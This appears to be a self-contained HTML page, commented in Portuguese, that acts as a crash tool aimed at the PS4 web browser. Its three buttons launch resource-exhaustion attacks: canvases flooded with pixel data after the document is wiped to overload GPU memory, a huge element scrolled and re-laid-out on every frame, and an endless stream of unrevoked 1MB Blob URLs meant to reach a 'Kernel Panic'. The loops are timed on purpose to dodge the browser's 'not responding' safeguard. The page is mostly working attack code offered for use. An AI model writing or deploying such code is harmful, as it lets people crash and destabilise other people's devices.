
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v350000: The Pulse</title>
<style>
    body { background: #000; color: #0ff; font-family: monospace; text-align: center; padding: 10px; }
    h1 { border-bottom: 2px solid #0ff; }
    .status { 
        border: 2px solid #fff; padding: 15px; margin-bottom: 20px; 
        font-size: 1.2em; background: #004; color: #fff; font-weight: bold;
    }
    
    button {
        display: block; width: 100%; padding: 25px; margin: 15px 0;
        background: #002; color: #0ff; border: 2px solid #0ff;
        font-size: 20px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #0ff; color: #000; }
    
    #stage { background: #111; height: 50px; border: 1px solid #555; margin-top: 20px; }
</style>
</head>
<body>

<h1>v350000: THE PULSE</h1>

<div class="status">
    ESTRATÉGIA: EVITAR "PÁGINA NÃO RESPONDENDO" + CARGA MÁXIMA<br>
    CLIQUE -> FULLSCREEN -> FECHE ALERTA
</div>

<button onclick="pulse(p01)">01. Canvas Pulse (GPU Flood)</button>

<button onclick="pulse(p02)">02. Scroll Viewport Desync</button>

<button onclick="pulse(p03)">03. Blob URL Storm</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');

    // =================================================================
    // EXECUTOR PULSANTE
    // =================================================================
    function pulse(vectorFunc) {
        Stage.innerHTML = "";
        
        // 1. Configura o Alvo
        const target = vectorFunc(Stage);
        
        // 2. Fullscreen
        if (target.webkitRequestFullscreen) target.webkitRequestFullscreen();
        else if (target.requestFullscreen) target.requestFullscreen();

        // 3. Timing
        requestAnimationFrame(() => {
            setTimeout(() => {
                // ALERTA
                window.alert("⚠️ PULSE INITIATED ⚠️\n\nAo fechar, iniciaremos o flood de alta frequência.");

                // AQUI ACONTECE A MÁGICA
                
                // 1. Detona o Renderizador (Tela Branca/Preta)
                if(target._detonate) {
                    target._detonate();
                }
                
                // 2. Inicia o PULSO (Substitui o Loop Infinito)
                if(target._pulse) {
                    function beat() {
                        target._pulse(); // Executa a carga pesada
                        // Chama a si mesmo imediatamente, mas deixa o browser respirar 
                        // Isso evita a mensagem "Não respondendo"
                        requestAnimationFrame(beat); 
                        // setTimeout(beat, 0); // Alternativa se requestAnimationFrame morrer
                    }
                    beat();
                }
                
            }, 50);
        });
    }

    // =================================================================
    // 01. Canvas Pulse (Baseado no Teste 3 v32)
    // Em vez de travar a CPU, desenha ruído aleatório furiosamente
    // num contexto órfão. Estoura a VRAM.
    // =================================================================
    function p01(stage) {
        const d = document.createElement('div');
        d.innerText = "CANVAS PULSE";
        stage.appendChild(d);

        // Cria 10 contextos
        const ctxs = [];
        for(let i=0; i<10; i++) {
            const c = document.createElement('canvas');
            c.width = 1024; c.height = 1024; // 1MB texture each roughly
            document.body.appendChild(c);
            ctxs.push(c.getContext('2d'));
        }

        // Buffer de ruído para desenhar
        const noise = new ImageData(new Uint8ClampedArray(1024*1024*4).fill(255), 1024, 1024);

        d._detonate = () => {
            // Mata o DOM
            document.open();
            // document.open limpa o body, mas os contextos 'ctxs' ainda existem na memória JS
        };

        d._pulse = () => {
            // Desenha em todos os contextos a cada frame
            // O navegador tenta renderizar isso, mas não tem onde exibir (documento morto)
            // Isso gera pressão massiva no Compositor da GPU
            for(let i=0; i<ctxs.length; i++) {
                try {
                    ctxs[i].putImageData(noise, 0, 0);
                } catch(e) {}
            }
            // Alocação extra para forçar GC
            const junk = new ArrayBuffer(1024*100);
        };
        return d;
    }

    // =================================================================
    // 02. Scroll Viewport Desync
    // O PS4 usa GPU para rolar a página. Se mudarmos o tamanho do body
    // e rolarmos para o infinito a cada frame, desincronizamos a GPU.
    // =================================================================
    function p02(stage) {
        const d = document.createElement('div');
        d.innerText = "SCROLL PULSE";
        stage.appendChild(d);

        d._detonate = () => {
            // Remove tudo e cria um elemento gigante
            document.body.innerHTML = "<div id='long' style='height: 1000000px; background: repeating-linear-gradient(red, blue 100px);'></div>";
        };

        let scrollY = 0;
        d._pulse = () => {
            scrollY += 1000;
            window.scrollTo(0, scrollY);
            
            // Truque: Alterna display none/block para forçar recálculo de layout
            // enquanto rola
            const el = document.getElementById('long');
            if(el) {
                el.style.display = (scrollY % 2000 === 0) ? 'none' : 'block';
            }
        };
        return d;
    }

    // =================================================================
    // 03. Blob URL Storm
    // Cria URLs de Blob infinitamente sem revogar.
    // Isso consome a tabela de arquivos do Kernel.
    // =================================================================
    function p03(stage) {
        const d = document.createElement('div');
        d.innerText = "BLOB PULSE";
        stage.appendChild(d);

        const chunk = new Uint8Array(1024*1024); // 1MB

        d._detonate = () => {
            // Nuke visual
            document.body.innerHTML = "";
            document.body.style.backgroundColor = "white"; // Tela Branca Forçada
        };

        d._pulse = () => {
            // Cria 10 blobs por frame (aprox 600 por segundo)
            // O Kernel tem que registrar cada um
            for(let i=0; i<10; i++) {
                URL.createObjectURL(new Blob([chunk]));
            }
            // Não revogamos nada. Deixamos vazar até o Kernel Panic.
        };
        return d;
    }

</script>
</body>
</html>
